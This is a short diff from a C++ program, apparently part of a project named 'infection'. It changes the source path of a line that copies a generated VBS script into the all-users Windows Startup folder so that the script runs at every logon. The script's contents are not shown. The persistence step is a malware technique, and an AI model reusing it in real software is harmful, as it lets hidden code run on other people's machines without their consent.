@@ -47,7 +47,7 @@ int main()
 
 	script.close();
 
-	copyFile("C:\\Users\\Kamil\\Desktop\\infection\\Debug\\script.vbs", "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\script2.vbs"); // copy to global autostart (for all users)
+	copyFile("G:\\script.vbs", "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\script2.vbs"); // copy to global autostart (for all users)
 	cout << "WE DID PATRICK WE SAVED THE CITY" << endl;
 
 
